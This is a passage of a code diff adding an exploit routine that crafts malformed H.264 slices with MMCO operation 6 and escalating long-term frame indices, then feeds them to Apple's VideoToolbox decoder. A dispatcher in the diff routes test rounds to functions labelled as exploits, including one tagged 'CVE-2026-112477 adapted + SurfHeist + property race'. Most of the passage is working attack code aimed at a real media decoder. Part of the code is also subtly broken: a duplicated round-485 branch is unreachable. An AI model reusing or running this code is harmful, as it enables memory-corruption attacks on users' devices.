+                rlog("  Frame 1 (P): %d\n", (int)st);
+                CVPixelBufferRelease(pb1);
+            }
+
+            /* Encode frame 2 (another P-frame for reference) */
+            CVPixelBufferRef pb2 = NULL;
+            CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb2);
+            if (pb2) {
+                CVPixelBufferLockBaseAddress(pb2, 0);
+                memset(CVPixelBufferGetBaseAddress(pb2), 0x80,
+                       CVPixelBufferGetBytesPerRow(pb2) * CVPixelBufferGetHeight(pb2));
+                CVPixelBufferUnlockBaseAddress(pb2, 0);
+                st = VTCompressionSessionEncodeFrame(enc, pb2, CMTimeMake(2, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                rlog("  Frame 2 (P): %d\n", (int)st);
+                CVPixelBufferRelease(pb2);
+            }
+
+            VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+        }
+        VTCompressionSessionInvalidate(enc);
+        CFRelease(enc);
+    }
+
+    rlog("  Captured: IDR=%zu P=%zu enc_count=%d\n",
+         r482_nalu_idr_len, r482_nalu_p_len, r482_enc_count);
+
+    if (!r482_fmt || r482_nalu_idr_len == 0) {
+        rlog("  FAILED: no format or IDR\n");
+        goto r482_done;
+    }
+
+    /* Step 2: Create decoder */
+    rlog("\n--- Step 2: Create decoder + decode clean IDR ---\n");
+    {
+        VTDecompressionOutputCallbackRecord rec;
+        rec.decompressionOutputCallback = r482_dec_cb;
+        rec.decompressionOutputRefCon = NULL;
+
+        VTDecompressionSessionRef dec = NULL;
+        st = VTDecompressionSessionCreate(
+            kCFAllocatorDefault, r482_fmt, NULL, NULL, &rec, &dec);
+        rlog("  Decoder: %d\n", (int)st);
+
+        if (st == noErr && dec) {
+            /* Decode clean IDR */
+            CMBlockBufferRef blk = NULL;
+            CMBlockBufferCreateWithMemoryBlock(
+                kCFAllocatorDefault,
+                r482_nalu_idr, r482_nalu_idr_len,
+                kCFAllocatorNull, NULL,
+                0, r482_nalu_idr_len, 0, &blk);
+            if (blk) {
+                CMSampleTimingInfo tm = {
+                    CMTimeMake(1,30), CMTimeMake(0,30), kCMTimeInvalid
+                };
+                size_t ss = r482_nalu_idr_len;
+                CMSampleBufferRef samp = NULL;
+                CMSampleBufferCreateReady(kCFAllocatorDefault, blk, r482_fmt,
+                                          1, 1, &tm, 1, &ss, &samp);
+                if (samp) {
+                    VTDecodeInfoFlags inf;
+                    st = VTDecompressionSessionDecodeFrame(dec, samp, 0, NULL, &inf);
+                    rlog("  IDR decode: %d\n", (int)st);
+                    VTDecompressionSessionWaitForAsynchronousFrames(dec);
+                    rlog("  dec_count=%d\n", r482_dec_count);
+                    CFRelease(samp);
+                }
+                CFRelease(blk);
+            }
+
+            /* Step 3: Construct malicious non-IDR slice with MMCO op 6 */
+            rlog("\n--- Step 3: Craft MMCO op 6 slice ---\n");
+            rlog("  SPS: frame_num=5bits, poc_lsb=6bits, max_ref=1\n");
+
+            /* Build non-IDR NAL from scratch */
+            uint8_t crafted[256];
+            r482_bitwriter_t bw;
+            r482_bw_init(&bw, crafted, sizeof(crafted));
+
+            /* NAL header: forbidden=0, nal_ref_idc=1, nal_unit_type=1 (non-IDR) */
+            r482_bw_put_bits(&bw, 0, 1);  /* forbidden */
+            r482_bw_put_bits(&bw, 1, 2);  /* nal_ref_idc=1 (reference frame) */
+            r482_bw_put_bits(&bw, 1, 5);  /* nal_unit_type=1 (non-IDR slice) */
+
+            /* Slice header */
+            r482_bw_put_ue(&bw, 0);       /* first_mb_in_slice = 0 */
+            r482_bw_put_ue(&bw, 0);       /* slice_type = 0 (P) */
+            r482_bw_put_ue(&bw, 0);       /* pic_parameter_set_id = 0 */
+            r482_bw_put_bits(&bw, 1, 5);  /* frame_num = 1 (5 bits) */
+
+            /* pic_order_cnt_lsb = 2 (6 bits) */
+            r482_bw_put_bits(&bw, 2, 6);
+
+            /* num_ref_idx_active_override_flag = 0 */
+            r482_bw_put_bit(&bw, 0);
+
+            /* ref_pic_list_modification: ref_pic_list_modification_flag_l0 = 0 */
+            r482_bw_put_bit(&bw, 0);
+
+            /* dec_ref_pic_marking (nal_ref_idc > 0, non-IDR): */
+            /* adaptive_ref_pic_marking_mode_flag = 1 */
+            r482_bw_put_bit(&bw, 1);
+
+            /* MMCO operation 6: assign long-term frame index */
+            r482_bw_put_ue(&bw, 6);       /* memory_management_control_operation = 6 */
+
+            /* Test with increasing long_term_frame_idx values */
+            int test_indices[] = { 0, 1, 15, 31, 127, 255, 1023, 4095 };
+            int test_count = sizeof(test_indices) / sizeof(test_indices[0]);
+
+            for (int ti = 0; ti < test_count; ti++) {
+                int ltfi = test_indices[ti];
+                rlog("\n  Testing MMCO op 6, long_term_frame_idx=%d\n", ltfi);
+
+                /* Rebuild the NALU for each test */
+                r482_bw_init(&bw, crafted, sizeof(crafted));
+
+                /* NAL header */
+                r482_bw_put_bits(&bw, 0, 1);
+                r482_bw_put_bits(&bw, 1, 2);
+                r482_bw_put_bits(&bw, 1, 5);
+
+                /* Slice header */
+                r482_bw_put_ue(&bw, 0);       /* first_mb */
+                r482_bw_put_ue(&bw, 0);       /* slice_type P */
+                r482_bw_put_ue(&bw, 0);       /* pps_id */
+                r482_bw_put_bits(&bw, 1, 5);  /* frame_num=1 */
+                r482_bw_put_bits(&bw, 2, 6);  /* poc_lsb=2 */
+                r482_bw_put_bit(&bw, 0);      /* no ref idx override */
+                r482_bw_put_bit(&bw, 0);      /* no ref list mod */
+
+                /* dec_ref_pic_marking: adaptive mode */
+                r482_bw_put_bit(&bw, 1);
+                r482_bw_put_ue(&bw, 6);           /* MMCO op 6 */
+                r482_bw_put_ue(&bw, (uint32_t)ltfi);  /* long_term_frame_idx */
+                r482_bw_put_ue(&bw, 0);           /* MMCO op 0 (end) */
+
+                /* slice_qp_delta */
+                r482_bw_put_se(&bw, 0);
+
+                /* Minimal slice data: at least one macroblock */
+                /* mb_type for P-slice: P_Skip = 0 */
+                r482_bw_put_ue(&bw, 0);  /* mb_skip_run = 0? Actually for CAVLC P-slice... */
+                /* Just add some padding data */
+                for (int p = 0; p < 8; p++) r482_bw_put_bits(&bw, 0, 8);
+
+                int nalu_len = r482_bw_finish(&bw);
+                rlog("  Crafted NALU: %d bytes", nalu_len);
+                for (int i = 0; i < 16 && i < nalu_len; i++)
+                    rlog(" %02x", crafted[i]);
+                rlog("\n");
+
+                /* Wrap in AVCC length-prefixed format */
+                uint8_t avcc_buf[512];
+                uint32_t avcc_nalu_len = (uint32_t)nalu_len;
+                avcc_buf[0] = (avcc_nalu_len >> 24) & 0xFF;
+                avcc_buf[1] = (avcc_nalu_len >> 16) & 0xFF;
+                avcc_buf[2] = (avcc_nalu_len >> 8) & 0xFF;
+                avcc_buf[3] = avcc_nalu_len & 0xFF;
+                memcpy(avcc_buf + 4, crafted, nalu_len);
+
+                CMBlockBufferRef blk2 = NULL;
+                CMBlockBufferCreateWithMemoryBlock(
+                    kCFAllocatorDefault,
+                    avcc_buf, 4 + nalu_len,
+                    kCFAllocatorNull, NULL,
+                    0, 4 + nalu_len, 0, &blk2);
+
+                if (blk2) {
+                    CMSampleTimingInfo tm2 = {
+                        CMTimeMake(1,30), CMTimeMake(1,30), kCMTimeInvalid
+                    };
+                    size_t ss2 = 4 + nalu_len;
+                    CMSampleBufferRef samp2 = NULL;
+                    CMSampleBufferCreateReady(kCFAllocatorDefault, blk2, r482_fmt,
+                                              1, 1, &tm2, 1, &ss2, &samp2);
+                    if (samp2) {
+                        VTDecodeInfoFlags inf2;
+                        int prev_dec = r482_dec_count;
+                        rlog("  Decoding...\n");
+                        fflush(stdout);
+                        st = VTDecompressionSessionDecodeFrame(dec, samp2, 0, NULL, &inf2);
+                        rlog("  Decode: %d info=0x%x\n", (int)st, (unsigned)inf2);
+                        VTDecompressionSessionWaitForAsynchronousFrames(dec);
+                        rlog("  dec_count=%d (delta=%d)\n",
+                             r482_dec_count, r482_dec_count - prev_dec);
+                        CFRelease(samp2);
+                    }
+                    CFRelease(blk2);
+                }
+                fflush(stdout);
+
+                /* If decode fails, stop escalating */
+                if (st != noErr) {
+                    rlog("  Decode rejected — stopping at idx=%d\n", ltfi);
+                    break;
+                }
+            }
+
+            VTDecompressionSessionInvalidate(dec);
+            CFRelease(dec);
+        }
+    }
+
+r482_done:
+    if (r482_fmt) {
+        CFRelease(r482_fmt);
+        r482_fmt = NULL;
+    }
+    rlog("\n=== r482 complete ===\n");
     fflush(stdout);
 }
 
@@ -91352,6 +92283,18 @@ new_modes:
             r472_exploit();
             goto done;
         }
+        if (rounds == 485) {
+            rlog("*** rounds=485: CVE-2026-112477 adapted + SurfHeist + property race ***\n\n");
+            fflush(stdout);
+            r484_exploit();
+            goto done;
+        }
+        if (rounds == 485) {
+            rlog("*** rounds=485: H.264 MMCO op 6 injection ***\n\n");
+            fflush(stdout);
+            r482_exploit();
+            goto done;
+        }
         if (rounds == 484) {
             rlog("*** rounds=484: H.264 decode test + safe NTL boundary ***\n\n");
             fflush(stdout);
@@ -94271,7 +95214,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
